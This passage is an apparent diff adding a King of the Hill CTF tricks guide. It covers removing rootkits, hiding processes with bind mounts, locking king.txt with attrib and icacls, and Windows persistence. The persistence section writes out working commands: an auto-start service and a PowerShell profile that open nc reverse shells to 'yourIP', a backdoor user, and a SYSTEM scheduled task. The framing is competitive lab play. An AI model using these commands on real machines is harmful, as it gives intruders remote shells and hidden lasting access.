+<p>I realize that KoTH players use diamorphine rootkit, but do not change the kill signal 63 (remembering that if you kill this PID and put 0 after it, the rootkit module will reappear).</p>
+<blockquote>
+<p>kill -63 0 &amp;&amp; rmmod diamorphine</p>
+</blockquote>
+<p>If in case the module name is not “diamorphine”, you can check the others using lsmod.</p>
+<blockquote>
+<p>lsmod | head -n5</p>
+</blockquote>
+<ul>
+<li>LD_PRELOAD Rootkit</li>
+</ul>
+<p>It is common for koth players to also use the LD_PRELOAD rootkit. The good news is that removing it is not very complex, just follow these commands below.</p>
+<blockquote>
+<p>echo “” &gt; /etc/ld.so.preload &amp;&amp; rm /lib/NameOf.So</p>
+</blockquote>
+<p>To discover the “.so” from the LD_PRELOAD rootkit, you can check the /lib/*.</p>
+<h2>Persistence KoTH Linux Machines</h2>
+<p>You can check my repository about persistence, all the techniques I use in koth, it’s there.</p>
+<h3><a href="https://github.com/MatheuZSecurity/D3m0n1z3dShell" rel="nofollow">DemonizedShell</a></h3>
+<p>Additional: you can use the mount command to mount a process in another directory, for example;</p>
+<blockquote>
+<p>mount –bind /tmp /proc/PID</p>
+</blockquote>
+<p>Therefore, if you look at the processes, the PID you put there will no longer appear, I think many players use this trick too.</p>
+<p>To undo this is simpler than it seems.</p>
+<blockquote>
+<p>mount | grep proc &amp;&amp; umount /proc/PID</p>
+</blockquote>
+<h2>Windows KoTH Machines</h2>
+<p>On koth windows machines I think I’ll put only the essentials in my view.</p>
+<h3>Protect King</h3>
+<ul>
+<li>Using loop in combination with attrib.</li>
+</ul>
+<p>Offline Machine</p>
+<pre><code>@echo off
+:x
+attrib -a -s -r -i C:\Users\Administrator\king-server\king.txt&amp;echo YourNickHere &gt; C:\Users\Administrator\king-server\king.txt&amp;attrib +a +s +r +i C:\Users\Administrator\king-server\king.txt
+goto x
+</code></pre>
+<p>H1-Medium Machine</p>
+<pre><code>@echo off
+:x
+attrib -a -s -r -i C:\ing.txt&amp;echo YourNickHere &gt; C:\king.txt&amp;attrib +a +s +r +i C:\king.txt
+goto x
+</code></pre>
+<ul>
+<li>Icalcs</li>
+</ul>
+<blockquote>
+<p>icacls king.txt /deny Everyone:(W)</p>
+</blockquote>
+<p>This command will basically deny write permission (“W”) for the group “Everyone” on the file “king.txt”</p>
+<p>Note that you can deny write permission for the Administrator user as well.</p>
+<blockquote>
+<p>icacls king.txt /deny Administrator:(M)</p>
+</blockquote>
+<p>You can use icacls in a loop too, it’s up to your imagination :D</p>
+<p>Well, I think this is enough for king protection on windows koth machines (until now).</p>
+<h3>Persistence</h3>
+<p>I think koth players rarely use persistence on windows machines, anyway I’ll put some.</p>
+<ul>
+<li>Service Execution</li>
+</ul>
+<p>Creating an malicious service.</p>
+<pre><code>sc create fsociety binpath= &quot;C:\nc.exe yourIP PORT -e cmd.exe&quot; start= &quot;auto&quot; obj= &quot;LocalSystem&quot; password= &quot;&quot;
+</code></pre>
+<ul>
+<li>New Account</li>
+</ul>
+<p>Creating New account.</p>
+<blockquote>
+<p>net user mrpwn mrpwnpassword123! /add</p>
+</blockquote>
+<ul>
+<li>SchTasks</li>
+</ul>
+<p>Creating a new scheduled task that will launch shell.cmd every minute.</p>
+<pre><code>schtasks /create /sc minute /mo 1 /tn &quot;yourtask&quot; /tr C:\shell.cmd /ru &quot;SYSTEM&quot;
+</code></pre>
+<ul>
+<li>Powershell Profile Persistence</li>
+</ul>
+<p>As soon as the user starts a new powershell, the command will be executed.</p>
+<pre><code>$PROFILE | select *
+echo &quot;C:\temp\nc.exe YourIP Port -e powershell&quot; &gt; C:\temp\payload.exe&quot; &gt; $PROFILE
+cat $PROFILE
+</code></pre>
+<p>You can also use C2 (Command &amp; Control).</p>
+<h3>Monitor Commands</h3>
+<ul>
+<li>
+<p><code>htop || top</code></p>
+</li>
+<li>
+<p><code>ps -efH</code></p>
+</li>
+<li>
+<p><code>pspy64</code></p>
+</li>
+</ul>
+<h4>This repository still has more things to be added.</h4>
+<h2>References and studies</h2>
+<p><a href="https://github.com/Terraminator/thm-koth-tricks" rel="nofollow">Terraminator Koth-Tricks Repo</a></p>
+<p><a href="https://www.ired.team/" rel="nofollow">ired.team</a></p>
+<ul>
+<li>Rootkit Studies</li>
+</ul>
+<p><a href="https://github.com/m0nad/Diamorphine" rel="nofollow">rootkit diamorphine</a></p>
+<p><a href="https://xcellerator.github.io/tags/rootkit/" rel="nofollow">xcellerator</a></p>
+<p><a href="https://0x00sec.org/t/writing-a-simple-rootkit-for-linux/29034" rel="nofollow">0x00sec.org</a></p>
+<p><a href="https://h0mbre.github.io/Learn-C-By-Creating-A-Rootkit/" rel="nofollow">h0mbre</a></p>
+<p><a href="https://blog.convisoappsec.com/linux-rootkits-hooking-syscalls/" rel="nofollow">Syscall Hooking</a></p>
+<p><a href="https://jm33.me/tag/rootkit.html" rel="nofollow">jm33.me</a></p>
+<p><a href="https://github.com/milabs/awesome-linux-rootkits" rel="nofollow">Awesome Rootkits</a></p>
+<ul>
+<li>Persistence</li>
+</ul>
+<p><a href="https://github.com/MatheuZSecurity/D3m0n1z3dShell" rel="nofollow">DemonizedShell</a></p>
+<p><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Persistence.md" rel="nofollow">PayloadsAllTheThings</a></p>
+<p><a href="https://pberba.github.io/security/2021/11/23/linux-threat-hunting-for-persistence-account-creation-manipulation/" rel="nofollow">Hunting Persistence</a></p>
+<p><a href="https://www.vx-underground.org/#E:/root/Papers/Linux/Persistence" rel="nofollow">vx-underground papers</a></p>
+<p><a href="https://hackmag.com/security/persistence-cheatsheet/" rel="nofollow">Persistence Cheat-Sheet</a></p>
+<hr />
+<h4>@MatheuzSecurity</h4>
+</body></html>
